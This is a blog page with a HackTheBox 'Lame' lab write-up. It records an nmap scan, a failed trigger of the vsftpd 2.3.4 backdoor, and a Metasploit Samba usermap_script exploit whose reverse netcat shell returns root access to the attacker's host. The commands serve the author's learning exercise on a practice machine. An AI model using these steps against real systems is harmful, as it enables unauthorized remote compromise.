<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HackTheBox - Lame Writeup | mdn1nj4's Blog</title><meta name="keywords" content="writeups,mdn1nj4 writeup,hackthebox writeups,hackthebox writeups medium,hackthebox-writeups password,hackthebox official writeups,hackthebox windows writeups,hackthebox ctf writeups,hackthebox reversing writeups,hackthebox machine writeups,blunder hackthebox writeups,hackthebox writeups github,hack the box writeups,hackthebox writeup walkthrough,hackthebox writeup machine,hackthebox writeup forum,hackthebox writeup remote,hackthebox writeup,hackthebox writeup love,hackthebox writeup buff,hackthebox writeup book,hackthebox blunder writeup,hackthebox bucket writeup,hackthebox blackfield writeup,hackthebox bounty writeup,hackthebox beep writeup,hackthebox breadcrumbs writeup,hackthebox writeup cache,hackthebox writeup cascade,hackthebox challenge writeups,hackthebox control writeup,hackthebox cap writeup,hackthebox compromised writeup,hackthebox cereal writeup,hackthebox writeup delivery,hackthebox writeup doctor,hackthebox dante writeup,hackthebox devel writeup,hackthebox debugme writeup,hackthebox writeup forest,hackthebox fatty writeup,hackthebox fuse writeup,hackthebox feline writeup,hackthebox fortress writeup,hackthebox forwardslash writeup,hackthebox freelancer writeup,hackthebox granny writeup,hackthebox grandpa writeup,hackthebox ghoul writeup,hackthebox giddy writeup,hackthebox hades writeup,hackthebox headache writeup,hackthebox heist writeup,hackthebox help writeup,hackthebox helpline writeup,hackthebox haystack writeup,hackthebox holiday writeup,hackthebox hdc writeup,hackthebox intense writeup,hackthebox invite writeup,hackthebox intelligence writeup,hackthebox infiltration writeup,hackthebox irked writeup,hackthebox included writeup,hackthebox inception writeup,hackthebox knife writeup,hackthebox kotarak writeup,hackthebox script kiddie writeup,kryptic ransomware hackthebox writeup,hackthebox writeup machine walkthrough,hackthebox magic writeup,hackthebox multimaster writeup,hackthebox monteverde writeup,hackthebox mango writeup,hackthebox monitors writeup,hackthebox writeup nest,hackthebox node writeup,hackthebox nibbles writeup,hackthebox netmon writeup,hackthebox notebook writeup,hackthebox writeup openadmin,hackthebox writeup omni,hackthebox obscurity writeup,hackthebox oouch writeup,hackthebox offshore writeup,hackthebox optimum writeup,hackthebox outrun writeup,hackthebox passage writeup,hackthebox postman writeup,hackthebox patents writeup,hackthebox phonebook writeup,hackthebox pit writeup,hackthebox proper writeup,hackthebox playertwo writeup,hackthebox quick writeup,hackthebox query writeup,hackthebox querier writeup,hackthebox writeup rules,hackthebox writeup rope,hackthebox writeup ready,hackthebox registry writeup,hackthebox resolute writeup,hackthebox re write up,hackthebox writeup sauna,hackthebox writeup scriptkiddie,hackthebox servmon writeup,hackthebox space writeup,hackthebox sharp writeup,hackthebox spectra writeup,hackthebox sniper writeup,hackthebox sneakymailer writeup,hackthebox writeup template,hackthebox writeup traceback,hackthebox writeup time,hackthebox writeup travel,hackthebox tabby writeup,hackthebox thenotebook writeup,hackthebox tenet writeup,hackthebox traverxec writeup,hackthebox vaccine writeup,hackthebox valentine writeup,hackthebox vault write up,hackthebox writeup writeup,hackthebox writeup windows,hackthebox worker writeup,hackthebox web writeup,hackthebox wall writeup,hack the box windows writeup,weather app hackthebox writeup,hackthebox xen writeup,hackthebox challenges writeup,hackthebox ctf writeup,hackthebox zetta writeup,hackthebox writeup"><meta name="author" content="mdn1nj4"><meta name="copyright" content="mdn1nj4"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Lame is the Easy level Hackthebox Machine.">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Lame Writeup">
<meta property="og:url" content="https://mdn1nj4.github.io/htb/hackthebox-lame-writeup/index.html">
<meta property="og:site_name" content="mdn1nj4&#39;s Blog">
<meta property="og:description" content="Lame is the Easy level Hackthebox Machine.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-09-12T01:09:00.000Z">
<meta property="article:modified_time" content="2022-04-10T07:54:41.866Z">
<meta property="article:author" content="mdn1nj4">
<meta property="article:tag" content="writeups">
<meta property="article:tag" content="mdn1nj4 writeup">
<meta property="article:tag" content="hackthebox writeups">
<meta property="article:tag" content="hackthebox writeups medium">
<meta property="article:tag" content="hackthebox-writeups password">
<meta property="article:tag" content="hackthebox official writeups">
<meta property="article:tag" content="hackthebox windows writeups">
<meta property="article:tag" content="hackthebox ctf writeups">
<meta property="article:tag" content="hackthebox reversing writeups">
<meta property="article:tag" content="hackthebox machine writeups">
<meta property="article:tag" content="blunder hackthebox writeups">
<meta property="article:tag" content="hackthebox writeups github">
<meta property="article:tag" content="hack the box writeups">
<meta property="article:tag" content="hackthebox writeup walkthrough">
<meta property="article:tag" content="hackthebox writeup machine">
<meta property="article:tag" content="hackthebox writeup forum">
<meta property="article:tag" content="hackthebox writeup remote">
<meta property="article:tag" content="hackthebox writeup">
<meta property="article:tag" content="hackthebox writeup love">
<meta property="article:tag" content="hackthebox writeup buff">
<meta property="article:tag" content="hackthebox writeup book">
<meta property="article:tag" content="hackthebox blunder writeup">
<meta property="article:tag" content="hackthebox bucket writeup">
<meta property="article:tag" content="hackthebox blackfield writeup">
<meta property="article:tag" content="hackthebox bounty writeup">
<meta property="article:tag" content="hackthebox beep writeup">
<meta property="article:tag" content="hackthebox breadcrumbs writeup">
<meta property="article:tag" content="hackthebox writeup cache">
<meta property="article:tag" content="hackthebox writeup cascade">
<meta property="article:tag" content="hackthebox challenge writeups">
<meta property="article:tag" content="hackthebox control writeup">
<meta property="article:tag" content="hackthebox cap writeup">
<meta property="article:tag" content="hackthebox compromised writeup">
<meta property="article:tag" content="hackthebox cereal writeup">
<meta property="article:tag" content="hackthebox writeup delivery">
<meta property="article:tag" content="hackthebox writeup doctor">
<meta property="article:tag" content="hackthebox dante writeup">
<meta property="article:tag" content="hackthebox devel writeup">
<meta property="article:tag" content="hackthebox debugme writeup">
<meta property="article:tag" content="hackthebox writeup forest">
<meta property="article:tag" content="hackthebox fatty writeup">
<meta property="article:tag" content="hackthebox fuse writeup">
<meta property="article:tag" content="hackthebox feline writeup">
<meta property="article:tag" content="hackthebox fortress writeup">
<meta property="article:tag" content="hackthebox forwardslash writeup">
<meta property="article:tag" content="hackthebox freelancer writeup">
<meta property="article:tag" content="hackthebox granny writeup">
<meta property="article:tag" content="hackthebox grandpa writeup">
<meta property="article:tag" content="hackthebox ghoul writeup">
<meta property="article:tag" content="hackthebox giddy writeup">
<meta property="article:tag" content="hackthebox hades writeup">
<meta property="article:tag" content="hackthebox headache writeup">
<meta property="article:tag" content="hackthebox heist writeup">
<meta property="article:tag" content="hackthebox help writeup">
<meta property="article:tag" content="hackthebox helpline writeup">
<meta property="article:tag" content="hackthebox haystack writeup">
<meta property="article:tag" content="hackthebox holiday writeup">
<meta property="article:tag" content="hackthebox hdc writeup">
<meta property="article:tag" content="hackthebox intense writeup">
<meta property="article:tag" content="hackthebox invite writeup">
<meta property="article:tag" content="hackthebox intelligence writeup">
<meta property="article:tag" content="hackthebox infiltration writeup">
<meta property="article:tag" content="hackthebox irked writeup">
<meta property="article:tag" content="hackthebox included writeup">
<meta property="article:tag" content="hackthebox inception writeup">
<meta property="article:tag" content="hackthebox knife writeup">
<meta property="article:tag" content="hackthebox kotarak writeup">
<meta property="article:tag" content="hackthebox script kiddie writeup">
<meta property="article:tag" content="kryptic ransomware hackthebox writeup">
<meta property="article:tag" content="hackthebox writeup machine walkthrough">
<meta property="article:tag" content="hackthebox magic writeup">
<meta property="article:tag" content="hackthebox multimaster writeup">
<meta property="article:tag" content="hackthebox monteverde writeup">
<meta property="article:tag" content="hackthebox mango writeup">
<meta property="article:tag" content="hackthebox monitors writeup">
<meta property="article:tag" content="hackthebox writeup nest">
<meta property="article:tag" content="hackthebox node writeup">
<meta property="article:tag" content="hackthebox nibbles writeup">
<meta property="article:tag" content="hackthebox netmon writeup">
<meta property="article:tag" content="hackthebox notebook writeup">
<meta property="article:tag" content="hackthebox writeup openadmin">
<meta property="article:tag" content="hackthebox writeup omni">
<meta property="article:tag" content="hackthebox obscurity writeup">
<meta property="article:tag" content="hackthebox oouch writeup">
<meta property="article:tag" content="hackthebox offshore writeup">
<meta property="article:tag" content="hackthebox optimum writeup">
<meta property="article:tag" content="hackthebox outrun writeup">
<meta property="article:tag" content="hackthebox passage writeup">
<meta property="article:tag" content="hackthebox postman writeup">
<meta property="article:tag" content="hackthebox patents writeup">
<meta property="article:tag" content="hackthebox phonebook writeup">
<meta property="article:tag" content="hackthebox pit writeup">
<meta property="article:tag" content="hackthebox proper writeup">
<meta property="article:tag" content="hackthebox playertwo writeup">
<meta property="article:tag" content="hackthebox quick writeup">
<meta property="article:tag" content="hackthebox query writeup">
<meta property="article:tag" content="hackthebox querier writeup">
<meta property="article:tag" content="hackthebox writeup rules">
<meta property="article:tag" content="hackthebox writeup rope">
<meta property="article:tag" content="hackthebox writeup ready">
<meta property="article:tag" content="hackthebox registry writeup">
<meta property="article:tag" content="hackthebox resolute writeup">
<meta property="article:tag" content="hackthebox re write up">
<meta property="article:tag" content="hackthebox writeup sauna">
<meta property="article:tag" content="hackthebox writeup scriptkiddie">
<meta property="article:tag" content="hackthebox servmon writeup">
<meta property="article:tag" content="hackthebox space writeup">
<meta property="article:tag" content="hackthebox sharp writeup">
<meta property="article:tag" content="hackthebox spectra writeup">
<meta property="article:tag" content="hackthebox sniper writeup">
<meta property="article:tag" content="hackthebox sneakymailer writeup">
<meta property="article:tag" content="hackthebox writeup template">
<meta property="article:tag" content="hackthebox writeup traceback">
<meta property="article:tag" content="hackthebox writeup time">
<meta property="article:tag" content="hackthebox writeup travel">
<meta property="article:tag" content="hackthebox tabby writeup">
<meta property="article:tag" content="hackthebox thenotebook writeup">
<meta property="article:tag" content="hackthebox tenet writeup">
<meta property="article:tag" content="hackthebox traverxec writeup">
<meta property="article:tag" content="hackthebox vaccine writeup">
<meta property="article:tag" content="hackthebox valentine writeup">
<meta property="article:tag" content="hackthebox vault write up">
<meta property="article:tag" content="hackthebox writeup writeup">
<meta property="article:tag" content="hackthebox writeup windows">
<meta property="article:tag" content="hackthebox worker writeup">
<meta property="article:tag" content="hackthebox web writeup">
<meta property="article:tag" content="hackthebox wall writeup">
<meta property="article:tag" content="hack the box windows writeup">
<meta property="article:tag" content="weather app hackthebox writeup">
<meta property="article:tag" content="hackthebox xen writeup">
<meta property="article:tag" content="hackthebox challenges writeup">
<meta property="article:tag" content="hackthebox ctf writeup">
<meta property="article:tag" content="hackthebox zetta writeup">
<meta property="article:tag" content="hackthebox writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/24633923?v=4"><link rel="canonical" href="https://mdn1nj4.github.io/htb/hackthebox-lame-writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-X9TKY34D40"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-X9TKY34D40');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HackTheBox - Lame Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-10 17:54:41'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="mdn1nj4's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">mdn1nj4's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">HackTheBox - Lame Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-12T01:09:00.000Z" title="Created 2021-09-12 11:09:00">2021-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-04-10T07:54:41.866Z" title="Updated 2022-04-10 17:54:41">2022-04-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">640</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>4min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HackTheBox - Lame Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><span id="more"></span>

<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><strong>Introduction</strong></h2><p>Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.</p>
<h2 id="Enumuration"><a href="#Enumuration" class="headerlink" title="Enumuration"></a><strong>Enumuration</strong></h2><p>Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.</p>
<pre><code>#nmap -sV -oN lame.nmap 10.10.10.3 -Pn
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 03:46 GMT
Nmap scan report for 10.10.10.3
Host is up (0.13s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds
</code></pre>
<h2 id="21-FTP-Exploit-Failed"><a href="#21-FTP-Exploit-Failed" class="headerlink" title="21 - FTP (Exploit Failed)"></a><strong>21 - FTP</strong> (<em>Exploit Failed</em>)</h2><p>I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.</p>
<pre><code>telnet 10.10.10.3 21
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is &#39;^]&#39;.
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass

#nc 10.10.10.3 6200
id
whoami
    #does not work
</code></pre>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><p>FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version. <img src="/"></p>
<h2 id="Samba-user-name-map-script"><a href="#Samba-user-name-map-script" class="headerlink" title="Samba user name map script"></a><strong>Samba user name map script</strong></h2><p>I found the exploit for the samba in searchsploit.There is exploit available in metasploit</p>
<pre><code>$searchsploit samba 3.0
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                 | osx/remote/16875.rb
Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)                     | unix/remote/16320.rb
Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rb
Samba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                               | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                             | solaris/remote/16329.rb
Samba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                                             | linux/dos/4732.c
Samba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)                                    | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.pl
Samba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>so i used it.  <a target="_blank" rel="noopener" href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">reference link</a></p>
<pre><code>msf6 &gt; use multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
rhost =&gt; 10.10.10.3
msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4
lhost =&gt; 10.10.14.4
msf6 exploit(multi/samba/usermap_script) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Command shell session 1 opened (10.10.14.4:4444 -&gt; 10.10.10.3:33415) at 2021-03-17 04:00:50 +0000

id
uid=0(root) gid=0(root)
</code></pre>
<p><strong><center>#Rooted this machine.</center></strong></p>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_linkedin"></a><a class="a2a_button_email"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/note/tunneling-and-port-forwarding/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Tunneling and Port Forwarding</div></div></a></div><div class="next-post pull-right"><a href="/note/spawning-tty-shell/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Spawning TTY Shell</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">mdn1nj4</div><div class="author-info__description">A collection of write-ups, walkthroughs and tips of my adventures</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://twitter.com/mdn1nj4" target="_blank" title=""><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://instagram.com/" target="_blank" title=""><i class="fab fa-instagram"></i></a><a class="social-icon" href="https://linkedin.com/" target="_blank" title=""><i class="fab fa-linkedin"></i></a><a class="social-icon" href="https://github.com/mdn1nj4" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumuration"><span class="toc-number">2.</span> <span class="toc-text">Enumuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-FTP-Exploit-Failed"><span class="toc-number">3.</span> <span class="toc-text">21 - FTP (Exploit Failed)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-user-name-map-script"><span class="toc-number">5.</span> <span class="toc-text">Samba user name map script</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-late-writeup/" title="HackTheBox - Late Writeup">HackTheBox - Late Writeup</a><time datetime="2022-04-11T08:30:00.000Z" title="Created 2022-04-11 18:30:00">2022-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-routerspace-writeup/" title="HackTheBox - RouterSpace Writeup">HackTheBox - RouterSpace Writeup</a><time datetime="2022-04-11T08:30:00.000Z" title="Created 2022-04-11 18:30:00">2022-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CVE/cve-2022-22965-build-and-attack/" title="CVE-2022-22965 - Build and Exploit">CVE-2022-22965 - Build and Exploit</a><time datetime="2022-04-06T08:30:00.000Z" title="Created 2022-04-06 18:30:00">2022-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-timelapse-writeup/" title="HackTheBox - Timelapse Writeup">HackTheBox - Timelapse Writeup</a><time datetime="2022-03-31T08:30:00.000Z" title="Created 2022-03-31 18:30:00">2022-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/pwnable.kr/pwnable.kr-fd-walkthrough/" title="Pwnable.kr - fd Walkthrough">Pwnable.kr - fd Walkthrough</a><time datetime="2022-03-29T08:30:00.000Z" title="Created 2022-03-29 18:30:00">2022-03-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By mdn1nj4</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
